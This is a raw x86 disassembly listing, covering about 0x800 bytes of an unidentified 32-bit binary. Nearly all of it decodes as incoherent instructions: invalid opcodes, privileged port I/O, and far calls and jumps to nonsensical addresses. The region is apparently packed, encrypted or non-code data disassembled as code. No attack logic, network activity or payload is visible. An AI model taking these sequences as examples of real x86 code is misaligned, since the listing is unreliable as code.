  41877e:	mov    ebx,0x50490a0
  418783:	(bad)  [edi]
  418785:	xor    esp,DWORD PTR [ebx-0x73]
  418788:	lds    ebp,FWORD PTR [ecx+0x2e]
  41878b:	and    BYTE PTR [esi-0x9677bf1],bl
  418791:	mov    bl,0xf4
  418793:	adc    cl,BYTE PTR [ebx-0x71c3b1f8]
  418799:	jb     0x4187bd
  41879b:	jae    0x41874f
  41879d:	scas   al,BYTE PTR es:[edi]
  41879e:	xchg   DWORD PTR [ebx],ecx
  4187a0:	fidiv  WORD PTR [esi-0x13030ca]
  4187a6:	sbb    BYTE PTR [ecx+ebx*4+0x7d52a5b],bh
  4187ad:	jns    0x41879e
  4187af:	and    esp,DWORD PTR [esi-0x48854766]
  4187b5:	test   BYTE PTR [esi],al
  4187b7:	icebp  
  4187b8:	sahf   
  4187b9:	jl     0x41873b
  4187bb:	pop    ebx
  4187bc:	adc    DWORD PTR [ebx+eax*8],ecx
  4187bf:	js     0x41878a
  4187c1:	std    
  4187c2:	sbb    esi,edx
  4187c4:	cmp    ecx,DWORD PTR [esi]
  4187c6:	add    al,0x9
  4187c8:	jo     0x418848
  4187ca:	add    DWORD PTR [edx-0x1fd527cf],ebp
  4187d0:	mov    dh,bl
  4187d2:	xor    edx,esp
  4187d4:	mov    eax,0xe5f0b470
  4187d9:	inc    esi
  4187da:	inc    ebp
  4187db:	and    eax,0x3ed859a8
  4187e0:	mov    ecx,0x545bceb9
  4187e5:	mov    WORD PTR [ebp-0x9],es
  4187e8:	cdq    
  4187e9:	stos   DWORD PTR es:[edi],eax
  4187ea:	sti    
  4187eb:	cwde   
  4187ec:	sbb    ebx,esp
  4187ee:	adc    bl,BYTE PTR [ebx+ecx*8+0x14]
  4187f2:	loope  0x4187f4
  4187f4:	push   ecx
  4187f5:	inc    edx
  4187f6:	pusha  
  4187f7:	test   al,0x49
  4187f9:	scas   eax,DWORD PTR es:[edi]
  4187fa:	lods   al,BYTE PTR ds:[esi]
  4187fb:	xlat   BYTE PTR ds:[ebx]
  4187fc:	loope  0x418811
  4187fe:	in     al,0xdb
  418800:	jl     0x4187fc
  418802:	fldenv [ebx-0x42e4f302]
  418808:	lea    edx,[ebp-0x3081834c]
  41880e:	and    eax,0x6da506cc
  418813:	and    al,0x87
  418815:	repnz pop es
  418817:	dec    ecx
  418818:	popa   
  418819:	sub    bl,BYTE PTR [ebp-0x4]
  41881c:	and    eax,0x7eda3aa0
  418821:	mov    ebp,0xae351cd9
  418826:	xchg   edi,eax
  418827:	dec    ebp
  418828:	pop    eax
  418829:	mul    BYTE PTR [ecx+0x17]
  41882c:	lock es push 0x40
  418830:	cdq    
  418831:	sub    eax,0x86084afd
  418836:	push   esi
  418837:	ret    
  418838:	out    0x1b,al
  41883a:	iret   
  41883b:	cmp    BYTE PTR [eax+esi*4-0x1],ah
  41883f:	(bad)  
  418840:	pop    ecx
  418841:	inc    ecx
  418842:	sbb    cl,BYTE PTR ds:0xb00ac333
  418848:	mov    gs:0xda9ec125,al
  41884e:	push   esp
  41884f:	adc    ch,bl
  418851:	shl    dl,cl
  418853:	dec    ecx
  418854:	pop    esp
  418855:	cli    
  418856:	xchg   esi,eax
  418857:	push   esp
  418858:	jnp    0x4187da
  41885a:	jge    0x41887e
  41885c:	jae    0x418896
  41885e:	and    DWORD PTR [eax+0x480f2150],0x90267cc4
  418868:	jp     0x418802
  41886a:	les    edx,FWORD PTR [ebp-0x1075e47b]
  418870:	js     0x418833
  418872:	jmp    0xcf8c66af
  418877:	imul   eax,DWORD PTR [ebx+eiz*2-0x39],0x27
  41887c:	push   0xfffffff4
  41887e:	imul   ebp,edi,0xffffffdb
  418881:	cmc    
  418882:	cmp    DWORD PTR [edx+esi*2-0x7e],esi
  418886:	iret   
  418887:	adc    BYTE PTR [ebx+0x25],0x8
  41888b:	dec    edx
  41888c:	popa   
  41888d:	mov    BYTE PTR [eax+edi*1],ch
  418890:	cmp    BYTE PTR [edx*1+0x3a98fc2],dl
  418897:	dec    edx
  418898:	adc    eax,0xa0bd8781
  41889d:	push   edi
  41889e:	inc    edi
  41889f:	retf   
  4188a0:	jge    0x41889d
  4188a2:	pop    ds
  4188a3:	xor    ecx,DWORD PTR [esi+0x4fd4adf4]
  4188a9:	dec    ebx
  4188aa:	and    al,BYTE PTR [eax-0x7]
  4188ad:	and    eax,0xcb113d00
  4188b2:	dec    eax
  4188b3:	push   0xba193bb3
  4188b8:	ds sbb eax,0xaf6a23f0
  4188be:	fdivr  DWORD PTR [ecx]
  4188c0:	cmp    DWORD PTR [eax-0x5e4dc7de],ebx
  4188c6:	mov    DWORD PTR [ecx+ecx*4+0x7af10829],ebp
  4188cd:	jge    0x418936
  4188cf:	iret   
  4188d0:	lahf   
  4188d1:	std    
  4188d2:	jmp    DWORD PTR [ecx+0x28]
  4188d5:	xor    al,0xbb
  4188d7:	ja     0x4188d6
  4188d9:	jbe    0x41886f
  4188db:	adc    al,bl
  4188dd:	dec    edi
  4188de:	sti    
  4188df:	xchg   BYTE PTR [ebp+0x4f],cl
  4188e2:	ss repz in al,dx
  4188e5:	xor    al,0x41
  4188e7:	inc    esp
  4188e8:	xor    BYTE PTR [ecx],bl
  4188ea:	mov    dl,0xec
  4188ec:	push   edi
  4188ed:	sbb    ebp,edi
  4188ef:	stos   DWORD PTR es:[edi],eax
  4188f0:	add    eax,0x88f6f640
  4188f5:	and    eax,0xcc5ec7fa
  4188fa:	pop    edi
  4188fb:	imul   ebx,DWORD PTR [edx],0x34
  4188fe:	push   ebx
  4188ff:	popa   
  418900:	mov    ds:0x5cd4e433,eax
  418905:	cmc    
  418906:	sub    DWORD PTR [eax-0x513aa362],edx
  41890c:	popf   
  41890d:	or     ecx,DWORD PTR [esi+0x35cffbda]
  418913:	xchg   DWORD PTR [ebp+0x2d],eax
  418916:	ret    0x4533
  418919:	mov    al,ds:0x377f54ce
  41891e:	sub    DWORD PTR [edx],ecx
  418920:	mov    ebx,0x735f1fcc
  418925:	jle    0x418906
  418927:	inc    ebx
  418928:	cmp    eax,0x79c607c0
  41892d:	and    edx,DWORD PTR [ecx+0x76]
  418930:	sbb    BYTE PTR [esi+esi*8-0x13],bl
  418934:	sub    dl,BYTE PTR ds:0x38987b37
  41893a:	or     ecx,0x4220a32e
  418940:	sahf   
  418941:	jle    0x4188cf
  418943:	mov    BYTE PTR [esp+eax*4+0x14f8ff57],ch
  41894a:	xchg   esi,eax
  41894b:	lahf   
  41894c:	sbb    al,0x83
  41894e:	sbb    eax,0xb68bea2b
  418953:	ja     0x4188eb
  418955:	mov    ebp,ss
  418957:	and    DWORD PTR [ecx],ebx
  418959:	mov    DWORD PTR [eax],esi
  41895b:	add    eax,0x6cdc5308
  418960:	pop    bp
  418962:	je     0x418940
  418964:	jbe    0x41899e
  418966:	mov    edi,0x20e1651a
  41896b:	(bad)  
  41896c:	fcomp  DWORD PTR [ebx]
  41896e:	sbb    esp,DWORD PTR [ebp+0x4873a16d]
  418974:	retf   0x4d32
  418977:	imul   edi,DWORD PTR [esi-0x3f4ad346],0xa59c7239
  418981:	jae    0x418937
  418983:	dec    esi
  418984:	jno    0x418951
  418986:	mov    esi,0xc1485dd6
  41898b:	inc    ebp
  41898d:	xchg   BYTE PTR [eax+0x59],al
  418990:	fprem  
  418992:	inc    ebx
  418993:	lea    ecx,[edi]
  418995:	or     eax,DWORD PTR [edi-0x41c3eb98]
  41899b:	jge    0x4189c0
  41899d:	sbb    BYTE PTR [ebp+0x20ca744f],dl
  4189a3:	add    DWORD PTR [edx-0x45],ebx
  4189a6:	sub    bl,al
  4189a8:	push   ebx
  4189a9:	inc    ebx
  4189aa:	add    eax,0xecd58553
  4189af:	jge    0x4189aa
  4189b1:	add    ch,dh
  4189b3:	fdiv   st,st(1)
  4189b5:	in     al,dx
  4189b6:	mov    ch,BYTE PTR ds:0x59f9c1fe
  4189bc:	ret    0xec7e
  4189bf:	add    DWORD PTR [edx+0x7d],ebp
  4189c2:	dec    ebx
  4189c3:	imul   ebp,DWORD PTR [edx+0x7cee259f],0xd
  4189ca:	xor    ebx,DWORD PTR [edx-0x5b0a9ecf]
  4189d0:	xchg   BYTE PTR [ebp+0x69405ee4],bl
  4189d6:	add    eax,0x4d7ea8b1
  4189db:	jecxz  0x418965
  4189dd:	inc    ebx
  4189de:	outs   dx,BYTE PTR ds:[esi]
  4189df:	frstor [ecx-0x33]
  4189e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189e3:	fisttp WORD PTR [ebp+0x14c05f10]
  4189e9:	in     eax,dx
  4189ea:	in     al,dx
  4189eb:	adc    eax,0x1785fd66
  4189f0:	dec    ebp
  4189f1:	bound  ebp,QWORD PTR [edi+0x460c3246]
  4189f7:	imul   esi,DWORD PTR [ebx],0xffffffcd
  4189fa:	mov    edi,0x2ac10618
  4189ff:	cwde   
  418a00:	(bad)  
  418a01:	stos   DWORD PTR es:[edi],eax
  418a02:	jns    0x418985
  418a04:	mov    eax,0x5b7ed0af
  418a09:	or     ch,BYTE PTR [edi+ecx*1+0x22]
  418a0d:	pop    eax
  418a0e:	shr    esp,0xb6
  418a11:	and    DWORD PTR [esi+eiz*4+0x41374db2],esp
  418a18:	mov    dl,0x4a
  418a1a:	mov    al,ds:0xd0606871
  418a1f:	inc    esi
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	push   0x22
  418a40:	(bad)  
  418a41:	jecxz  0x418a7c
  418a43:	pop    ds
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	test   eax,0x7293bfbc
  418a4f:	aad    0xbd
  418a51:	or     ch,al
  418a53:	inc    edx
  418a54:	xlat   BYTE PTR ds:[ebx]
  418a55:	dec    edi
  418a56:	xor    DWORD PTR [ebx+0x72294473],ebx
  418a5c:	jns    0x418a15
  418a5e:	jno    0x418a41
  418a60:	add    ecx,eax
  418a62:	mov    ebx,0x82e0bde7
  418a67:	sbb    dl,dh
  418a69:	mov    dh,0x83
  418a6b:	out    dx,eax
  418a6c:	test   eax,edx
  418a6e:	popf   
  418a6f:	push   edx
  418a70:	jl     0x418a2b
  418a72:	jns    0x418ae1
  418a74:	sub    cl,ch
  418a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a77:	mov    esi,0xe834e9db
  418a7c:	cmp    al,0x84
  418a7e:	mov    bh,0x11
  418a80:	fsub   DWORD PTR [ebx]
  418a82:	xchg   ebp,eax
  418a83:	ja     0x418aa1
  418a85:	or     edi,DWORD PTR [edi+0x18]
  418a88:	inc    ebp
  418a89:	sub    bh,BYTE PTR [edi-0x39b4b0a0]
  418a8f:	mov    dh,0x49
  418a91:	out    dx,eax
  418a92:	xchg   esp,eax
  418a93:	adc    ebx,edi
  418a95:	cmp    eax,0xb79980ac
  418a9a:	cmp    dh,dh
  418a9c:	jmp    0xeee169d1
  418aa1:	xchg   ebx,eax
  418aa2:	ins    DWORD PTR es:[edi],dx
  418aa3:	push   cs
  418aa4:	xlat   BYTE PTR ds:[ebx]
  418aa5:	mov    eax,0x99aeafef
  418aaa:	or     al,0xff
  418aac:	mov    dl,0xc7
  418aae:	mov    dh,0xd4
  418ab0:	jmp    0xfc8c2088
  418ab5:	dec    esp
  418ab6:	aad    0xee
  418ab8:	or     DWORD PTR [ebp-0xd854398],esi
  418abe:	stos   DWORD PTR es:[edi],eax
  418abf:	adc    BYTE PTR [edi-0x70],cl
  418ac2:	shr    DWORD PTR [edi-0x4],1
  418ac5:	sub    bh,ah
  418ac7:	pop    edi
  418ac8:	xchg   esi,eax
  418ac9:	pop    ebx
  418aca:	leave  
  418acb:	jmp    0xa9d0:0x2de39050
  418ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ad3:	loope  0x418aa4
  418ad5:	sahf   
  418ad6:	lahf   
  418ad7:	mov    WORD PTR [ebp+0x3e17b18a],gs
  418add:	call   0x3a2:0x48849d83
  418ae4:	(bad)  ds:0xde4649d7
  418aea:	or     bl,BYTE PTR ds:0xfc2b10a
  418af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418af1:	(bad)  
  418af2:	sahf   
  418af3:	and    ecx,esi
  418af5:	imul   edx,esp,0x25
  418af8:	fsub   st,st(4)
  418afa:	dec    edi
  418afb:	pop    DWORD PTR [ebp*8+0x1bc55d3e]
  418b02:	push   esp
  418b03:	stos   DWORD PTR es:[edi],eax
  418b04:	cmp    al,0x2c
  418b06:	mov    DWORD PTR [ebx],edi
  418b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b09:	(bad)  
  418b0a:	jae    0x418af6
  418b0c:	dec    ecx
  418b0d:	mov    bl,0x2
  418b0f:	call   0x9148:0x5064bd50
  418b16:	pop    edx
  418b17:	cmp    eax,0xa3316528
  418b1c:	lods   al,BYTE PTR ds:[esi]
  418b1d:	add    edi,edi
  418b1f:	mov    ecx,DWORD PTR [edi]
  418b21:	mov    ah,0x18
  418b23:	call   0x14ee13e2
  418b28:	(bad)  
  418b29:	sbb    DWORD PTR [edi],edi
  418b2b:	jecxz  0x418b41
  418b2d:	call   0x108d:0x1a6b620e
  418b34:	cs out 0x35,al
  418b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b38:	scas   al,BYTE PTR es:[edi]
  418b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3a:	xchg   edi,esp
  418b3c:	pop    ss
  418b3d:	js     0x418bb9
  418b3f:	or     esp,edi
  418b41:	push   0xffffffde
  418b43:	sti    
  418b44:	call   0x781b:0xc8e75ffa
  418b4b:	js     0x418b9c
  418b4d:	fadd   QWORD PTR [ecx-0x79]
  418b50:	push   edx
  418b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b52:	adc    bl,dl
  418b54:	outs   dx,DWORD PTR ds:[esi]
  418b55:	jmp    0xe3fc:0xc3634890
  418b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b5d:	cli    
  418b5e:	imul   esi,DWORD PTR [ecx*4-0x6f4516a2],0x1475b0b4
  418b69:	push   ds
  418b6a:	loop   0x418b3e
  418b6c:	xlat   BYTE PTR ds:[ebx]
  418b6d:	test   eax,0xcbbc905b
  418b72:	xchg   BYTE PTR [ebp-0x4be32512],ah
  418b78:	inc    esp
  418b79:	jb     0x418bb5
  418b7b:	bound  edx,QWORD PTR [ecx]
  418b7d:	jge    0x418bd1
  418b7f:	add    ah,cl
  418b81:	push   cs
  418b82:	jmp    0x8c2c4006
  418b87:	repnz sub al,BYTE PTR [edx-0x590fbef8]
  418b8e:	adc    ah,BYTE PTR [ebp-0x79e131d4]
  418b94:	test   edx,0x69df1bb7
  418b9a:	lea    esi,[edi+ecx*8-0x77c9a8c]
  418ba1:	stc    
  418ba2:	lods   eax,DWORD PTR ds:[esi]
  418ba3:	daa    
  418ba4:	div    DWORD PTR [ecx-0x15d61f0f]
  418baa:	jbe    0x418bee
  418bac:	out    0x2f,eax
  418bae:	adc    eax,0x971189fc
  418bb3:	or     al,0x70
  418bb5:	into   
  418bb6:	sbb    BYTE PTR [edx],ah
  418bb8:	popa   
  418bb9:	or     bh,BYTE PTR [ecx-0x31f446b2]
  418bbf:	(bad)  [esi-0x3f]
  418bc2:	xor    ch,BYTE PTR [edx]
  418bc4:	repnz imul edx,DWORD PTR [edx],0x88aa3732
  418bcb:	inc    ecx
  418bcc:	inc    ebp
  418bcd:	or     BYTE PTR [edx-0x3f],0x17
  418bd1:	push   edx
  418bd2:	dec    ecx
  418bd3:	adc    BYTE PTR [ebx+0x80f66a4],bh
  418bd9:	push   ss
  418bda:	sbb    BYTE PTR [edi+eiz*2],dh
  418bdd:	mov    bh,0x69
  418bdf:	dec    ecx
  418be0:	push   ebp
  418be1:	mov    esi,0xe2bd3d21
  418be6:	jle    0x418b6a
  418be8:	test   al,0x45
  418bea:	or     cl,bl
  418bec:	leave  
  418bed:	mov    dl,0xbc
  418bef:	mov    bl,0x2d
  418bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf2:	add    al,0x15
  418bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf5:	leave  
  418bf6:	rcl    BYTE PTR ds:0xb518413a,1
  418bfc:	xor    BYTE PTR [edi+0x59],dl
  418bff:	push   cs
  418c00:	sbb    al,0x65
  418c02:	popa   
  418c03:	mov    eax,ds:0x7bbefc0f
  418c08:	ficomp WORD PTR [ebx+edx*2+0x2d47bb3a]
  418c0f:	add    al,0x65
  418c11:	in     eax,0x92
  418c13:	inc    edx
  418c14:	call   0x9b56:0xcad5b153
  418c1b:	loopne 0x418c31
  418c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1e:	lea    ebp,[esi-0x6d7c6d0e]
  418c24:	add    al,0xe4
  418c26:	sub    DWORD PTR [edx-0x39],eax
  418c29:	scas   al,BYTE PTR es:[edi]
  418c2a:	jecxz  0x418c30
  418c2c:	daa    
  418c2d:	scas   al,BYTE PTR es:[edi]
  418c2e:	add    ebx,DWORD PTR [ebp+0xa]
  418c31:	xor    esp,DWORD PTR [ecx]
  418c33:	dec    esi
  418c34:	and    eax,0x863429cb
  418c39:	(bad)  
  418c3a:	add    esi,DWORD PTR [edi+ecx*1-0x7b]
  418c3e:	mov    cl,0x9b
  418c40:	rcl    DWORD PTR [eax],1
  418c42:	cmp    cl,BYTE PTR [ebx]
  418c44:	loope  0x418bf0
  418c46:	jl     0x418c17
  418c48:	jns    0x418c29
  418c4a:	lds    ebp,FWORD PTR [edx-0x5]
  418c4d:	aas    
  418c4e:	push   eax
  418c4f:	mov    ebp,0x1150f057
  418c54:	push   ss
  418c55:	sbb    al,0x3
  418c57:	adc    al,0x6f
  418c59:	or     al,0x8d
  418c5b:	(bad)  
  418c5c:	jno    0x418c63
  418c5e:	dec    edx
  418c5f:	icebp  
  418c60:	retf   
  418c61:	sub    DWORD PTR [edi-0x1f5e07f9],0x33b21565
  418c6b:	cs jns 0x418c30
  418c6e:	(bad)  
  418c6f:	repnz leave 
  418c71:	gs nop
  418c73:	xchg   esp,eax
  418c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c75:	call   0x3ce19b01
  418c7a:	xchg   ebp,eax
  418c7b:	stos   DWORD PTR es:[edi],eax
  418c7c:	leave  
  418c7d:	sub    bh,ch
  418c7f:	sbb    ch,BYTE PTR [edx-0x7e]
  418c82:	dec    esp
  418c83:	dec    ecx
  418c84:	push   esp
  418c85:	dec    esi
  418c86:	xchg   DWORD PTR [edi+0x163b5215],esi
  418c8c:	mov    bl,0xb2
  418c8e:	test   eax,0x59e17ca5
  418c93:	cli    
  418c94:	shl    BYTE PTR [edx],cl
  418c96:	or     BYTE PTR [ecx-0x5fa6870b],ah
  418c9c:	outs   dx,DWORD PTR ds:[esi]
  418c9d:	pop    edx
  418c9e:	cld    
  418c9f:	push   0xdb3f58a1
  418ca4:	sbb    edx,ebp
  418ca6:	ss loope 0x418d0c
  418ca9:	in     eax,dx
  418caa:	jg     0x418c42
  418cac:	pop    esp
  418cad:	scas   al,BYTE PTR es:[edi]
  418cae:	dec    edi
  418caf:	loope  0x418c3a
  418cb1:	mov    ds:0x917c7c50,al
  418cb6:	cmp    eax,0x72a5d98
  418cbb:	dec    BYTE PTR [esi]
  418cbd:	sub    eax,0x7ecb082f
  418cc2:	add    al,0x93
  418cc4:	jno    0x418c81
  418cc6:	mov    eax,0x50e8037c
  418ccb:	inc    ecx
  418ccc:	imul   esp,edx,0x175d457e
  418cd2:	call   0xf7eab4eb
  418cd7:	sbb    eax,0x86c765ae
  418cdc:	aad    0xd5
  418cde:	in     al,dx
  418cdf:	repnz pop ss
  418ce1:	dec    edx
  418ce2:	ja     0x418d30
  418ce4:	jle    0x418d2a
  418ce6:	loop   0x418ce7
  418ce8:	mov    ds:0x6f254f61,al
  418ced:	popf   
  418cee:	js     0x418c96
  418cf0:	and    DWORD PTR [eax-0x37],ecx
  418cf3:	dec    ecx
  418cf4:	sub    cl,BYTE PTR [edx]
  418cf6:	cli    
  418cf7:	not    BYTE PTR [edx]
  418cf9:	inc    eax
  418cfa:	call   FWORD PTR [esi+0x11]
  418cfd:	cs test ecx,ebp
  418d00:	lods   al,BYTE PTR ds:[esi]
  418d01:	mov    ch,BYTE PTR [esi]
  418d03:	or     DWORD PTR [ecx-0x72],esp
  418d06:	test   eax,0x7f58cf7b
  418d0b:	and    al,0xf
  418d0d:	cmp    DWORD PTR [ebx-0x74],edi
  418d10:	push   ds
  418d11:	dec    edx
  418d12:	sti    
  418d13:	les    esp,FWORD PTR [edx-0x36]
  418d16:	ds mov bl,0x74
  418d19:	test   DWORD PTR [ecx+0x95293ac],0xd731b6ed
  418d23:	dec    edx
  418d24:	idiv   BYTE PTR [esi]
  418d26:	mov    bl,0x4f
  418d28:	out    0xb4,eax
  418d2a:	xorps  xmm6,XMMWORD PTR [ecx-0x662d0c63]
  418d31:	jmp    0x747bb0f4
  418d36:	xchg   ebx,eax
  418d37:	sub    BYTE PTR [edx-0x10],bl
  418d3a:	adc    edx,ebx
  418d3c:	push   ebp
  418d3d:	lds    edi,FWORD PTR [edx]
  418d3f:	jge    0x418d40
  418d41:	jno    0x418d04
  418d43:	and    al,0x21
  418d45:	cmc    
  418d46:	xor    bl,al
  418d48:	push   ecx
  418d49:	or     edi,esp
  418d4b:	inc    esp
  418d4c:	push   eax
  418d4d:	stc    
  418d4e:	fstp   TBYTE PTR [esi-0x2e6275d0]
  418d54:	lea    ecx,[ebp+esi*2+0x3a31b88e]
  418d5b:	pushf  
  418d5c:	arpl   WORD PTR [ecx+0x456d460d],di
  418d62:	hlt    
  418d63:	sbb    eax,0x8226f041
  418d68:	mov    ?,edx
  418d6a:	add    eax,0x3377facf
  418d6f:	push   es
  418d70:	leave  
  418d71:	inc    esi
  418d72:	inc    esp
  418d73:	idiv   BYTE PTR [ebx]
  418d75:	add    dl,BYTE PTR [edx]
  418d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d78:	jmp    0x152f419a
  418d7d:	jmp    0x6e11d3b8
  418d82:	jb     0x418d43
  418d84:	push   esp
  418d85:	mov    ecx,0xdf6c6e18
  418d8a:	xor    DWORD PTR [edx+0x56],esi
  418d8d:	and    ch,al
  418d8f:	cmp    ebx,DWORD PTR [ebp+0x40]
  418d92:	(bad)  
  418d93:	xlat   BYTE PTR ds:[ebx]
  418d94:	shl    DWORD PTR [esi],cl
  418d96:	ror    DWORD PTR [ebp-0x43],cl
  418d99:	lahf   
  418d9a:	out    0xdf,al
  418d9c:	fdivr  st,st(5)
  418d9e:	cli    
  418d9f:	pop    es
  418da0:	or     bl,BYTE PTR [ecx+0xfa3b2fc]
  418da6:	adc    al,0x7f
  418da8:	js     0x418e06
  418daa:	inc    ebp
  418dab:	adc    bh,BYTE PTR [edi]
  418dad:	popa   
  418dae:	fdiv   QWORD PTR [edx-0x229045ed]
  418db4:	js     0x418db6
  418db6:	rcr    DWORD PTR [edx-0x4fac65bc],cl
  418dbc:	pop    es
  418dbd:	dec    ecx
  418dbe:	div    BYTE PTR [eax-0x15]
  418dc1:	pop    ebp
  418dc2:	aaa    
  418dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc4:	and    BYTE PTR [ebx-0x58d00843],dl
  418dca:	xor    ecx,DWORD PTR [eax+0x40]
  418dcd:	push   cs
  418dce:	cvtps2pi mm7,QWORD PTR [edi]
  418dd1:	(bad)  
  418dd2:	jmp    0x95a8c5e8
  418dd7:	repz in al,dx
  418dd9:	out    dx,eax
  418dda:	lock pop ds
  418ddc:	mov    esp,0x2c9c090e
  418de1:	pop    es
  418de2:	jle    0x418dd4
  418de4:	jb     0x418dbf
  418de6:	push   es
  418de7:	sbb    DWORD PTR [edx+0x61927087],0x1edc9bf9
  418df1:	cs and al,0x70
  418df4:	mov    ch,BYTE PTR [ebx-0x3a]
  418df7:	in     eax,0xd9
  418df9:	push   es
  418dfa:	xor    BYTE PTR [eax],0xc4
  418dfd:	je     0x418e4d
  418dff:	adc    eax,0xa6fd4ac2
  418e04:	sahf   
  418e05:	loope  0x418e39
  418e07:	mov    ecx,0x81819ade
  418e0c:	or     eax,0x52004880
  418e11:	dec    esi
  418e12:	mov    ch,0xd
  418e14:	mov    ebx,DWORD PTR [edx+0x900c0d8]
  418e1a:	add    ch,BYTE PTR [ecx]
  418e1c:	pop    edi
  418e1d:	retf   0x3b62
  418e20:	pop    ss
  418e21:	mov    bh,0x20
  418e23:	popa   
  418e24:	mov    DWORD PTR [ebx+ebx*4],esp
  418e27:	adc    al,cl
  418e29:	pop    ebx
  418e2a:	xor    dl,BYTE PTR [edi]
  418e2c:	repnz add al,0xc6
  418e2f:	addr16 sbb ecx,eax
  418e32:	sub    al,0x70
  418e34:	enter  0xe565,0x50
  418e38:	lods   eax,DWORD PTR ds:[esi]
  418e39:	push   ecx
  418e3a:	or     BYTE PTR [ecx-0x1c],cl
  418e3d:	in     eax,0xbf
  418e3f:	mov    dh,0x57
  418e41:	fwait
  418e42:	out    0x52,eax
  418e44:	imul   ecx,DWORD PTR [ebx],0xfa7a5024
  418e4a:	inc    edi
  418e4b:	call   0x156c:0x5c44ab1b
  418e52:	push   0x31dc2fa1
  418e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e58:	rol    BYTE PTR [eax],0x47
  418e5b:	cmc    
  418e5c:	mov    esi,0xe34b0e1c
  418e61:	add    eax,0x131f07fb
  418e66:	stos   DWORD PTR es:[edi],eax
  418e67:	xchg   DWORD PTR [ecx+0x75],esi
  418e6a:	sar    BYTE PTR [ecx],cl
  418e6c:	cwde   
  418e6d:	aas    
  418e6e:	xchg   edx,eax
  418e6f:	push   0x1f24b808
  418e74:	sar    bh,cl
  418e76:	and    DWORD PTR [ecx+0x576ad5c8],esi
  418e7c:	cmp    al,0x9a
  418e7e:	mov    al,0x92
  418e80:	pop    es
  418e81:	cld    
  418e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e84:	loope  0x418e34
  418e86:	jl     0x418e27
  418e88:	xchg   esp,eax
  418e89:	inc    edi
  418e8a:	push   edi
  418e8b:	shr    BYTE PTR [ebp+0x44d1e0c5],1
  418e91:	mov    ebp,0xe5d0144
  418e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e97:	adc    al,0x42
  418e99:	sar    dl,1
  418e9b:	inc    eax
  418e9c:	sbb    eax,0x52f6e0bc
  418ea1:	xchg   edx,eax
  418ea2:	fstp   DWORD PTR [ecx+0x12]
  418ea5:	cmc    
  418ea6:	sbb    ch,BYTE PTR cs:[eax]
  418ea9:	stos   DWORD PTR es:[edi],eax
  418eaa:	jnp    0x418ed9
  418eac:	push   ecx
  418ead:	xchg   esi,eax
  418eae:	sub    BYTE PTR [ebx-0x1a143b7c],dl
  418eb4:	pop    ebp
  418eb5:	push   edx
  418eb6:	xor    dh,BYTE PTR [edi-0x1f0b53f9]
  418ebc:	repz inc esi
  418ebe:	xchg   esi,eax
  418ebf:	fistp  DWORD PTR [ebp+0x46a7e48e]
  418ec5:	add    BYTE PTR [edi-0x69],dh
  418ec8:	(bad)  
  418ec9:	pop    ecx
  418eca:	es popf 
  418ecc:	push   esi
  418ecd:	add    eax,0x42dfeda2
  418ed2:	addr16 in eax,dx
  418ed4:	unpcklps xmm7,xmm5
  418ed7:	pop    edi
  418ed8:	push   ss
  418ed9:	test   al,0x71
  418edb:	fstp   QWORD PTR [esi-0x6]
  418ede:	bound  esp,QWORD PTR [edx+esi*4+0x5d419d4d]
  418ee5:	xor    eax,0xfbc866eb
  418eea:	ds push ss
  418eec:	out    dx,eax
  418eed:	push   edi
  418eee:	sbb    esp,DWORD PTR [eax+0x7]
  418ef1:	stos   DWORD PTR es:[edi],eax
  418ef2:	and    DWORD PTR [edx],edi
  418ef4:	cmp    bh,BYTE PTR [edx+edi*2-0x2b39e0f2]
  418efb:	rcr    DWORD PTR [edx+ebx*1-0x7d],0xef
  418f00:	lods   eax,DWORD PTR ds:[esi]
  418f01:	int3   
  418f02:	fdiv   st,st(6)
  418f04:	and    bl,BYTE PTR [edi+0x6cd8bb51]
  418f0a:	outs   dx,DWORD PTR ds:[esi]
  418f0b:	test   eax,0x8a71f0f2
  418f10:	lods   eax,DWORD PTR ds:[esi]
  418f11:	sbb    edx,eax
  418f13:	jmp    0x418eba
  418f15:	and    al,0xc2
  418f17:	push   esi
  418f18:	and    bl,bl
  418f1a:	shr    BYTE PTR [edx-0x519ff44e],1
  418f20:	js     0x418f8e
  418f22:	std    
  418f23:	push   ebp
  418f24:	popa   
  418f25:	popf   
  418f26:	cmp    ecx,edx
  418f28:	fs pop ds
  418f2a:	out    dx,eax
  418f2b:	cmp    eax,0x93e0e8df
  418f30:	dec    eax
  418f31:	push   edx
  418f32:	push   esi
  418f33:	scas   eax,DWORD PTR es:[edi]
  418f34:	mov    cl,0x8c
  418f36:	fcom   st(6)
  418f38:	jo     0x418f53
  418f3a:	out    0x82,al
  418f3c:	xchg   ebx,eax
  418f3d:	pop    ecx
  418f3e:	jnp    0x418f5b
  418f40:	(bad)  
  418f41:	xchg   ebp,eax
